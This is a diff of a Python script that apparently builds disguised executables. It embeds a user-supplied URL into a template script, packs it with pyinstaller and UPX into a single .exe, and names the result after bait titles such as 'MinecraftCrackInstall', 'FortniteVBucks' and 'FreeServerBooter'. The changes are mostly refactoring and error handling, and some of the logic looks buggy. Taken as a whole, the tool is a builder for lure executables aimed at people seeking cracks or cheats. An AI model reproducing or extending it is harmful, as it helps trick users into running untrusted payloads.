@@ -10,7 +10,6 @@ fakeNames = ["MinecraftCrackInstall",
              "VegasProCrack",
              "FreeServerBooter",
              "MinecraftServerBooter",
-             "JoeMama",
              "output",
              "FortniteCrack",
              "FortniteVBucks",
@@ -49,14 +48,14 @@ else:
     if exeName.endswith(".exe"):
         exeName = args.outname.split(".")[0] # remove .exe extension
     else:
-        for ichar in [">", "<", "|", "\b", " "]:
-            exeName = args.outname.replace(ichar, "_") # hey, none of those shenanigans please!!
+        for iChar in [">", "<", "|", "\b", " "]:
+            exeName = args.outname.replace(iChar, "_") # hey, none of those shenanigans please!!
 
 url = args.url
 if url.startswith("http://") or url.startswith("https://"): # then we have URL validation, all there is to it :)
     pass
 else:
-    print("%s: error: is invalid (make sure it starts with http:// or https:// !)" % sys.argv[0])
+    print(f"{sys.argv[0]}: error: is invalid (make sure it starts with http:// or https:// !)")
     exit()
 
 # This is the part where the real stuff begins ..
@@ -65,26 +64,32 @@ else:
 os.mkdir(exeName + "_exe") # just to make sure a system-reserved name like "con" is corrected
 
 f = open(exeName + ".py", "x")
-f.write(urlScript % (args.url))
+f.write(urlScript % args.url)
 f.close() # aight file script written
 
 os.chdir("%s_exe" % exeName)
 
-commands = os.system("pyinstaller --onefile %s.py" % (exeName))
+commands = os.system("pyinstaller --upx-dir upx --onefile %s.py" % exeName)
 
-if commands == 1:
+if commands != 1:
     pass
 else:
-    pass
+    print(f"{sys.argv[0]}: error: pyinstaller not found :/ (is the python scripts folder in your path?)") # no cleanup for now
+    exit()
 
 os.chdir("dist")
-os.system("move %s.exe .." % (exeName))
+try:
+    os.system("move %s.exe .." % exeName)
+except:
+    print("%s: error: .exe not found (is upx in the upx/ folder?)" % sys.argv[0])
+    exit()
+
 os.chdir("..")
 
-os.system("rmdir /S /Q build") # deletion
+os.system("rmdir /S /Q build") # deletion/cleanup
 os.system("rmdir /S /Q dist")
 os.system("rmdir /S /Q __pycache__")
-os.system("del %s.spec" % (exeName))
-os.system("del %s.py" % (exeName))
+os.system("del %s.spec" % exeName)
+os.system("del %s.py" % exeName)
 
-os.chdir("move %s.exe .." % (exeName))
+os.system("move %s.exe .." % exeName)
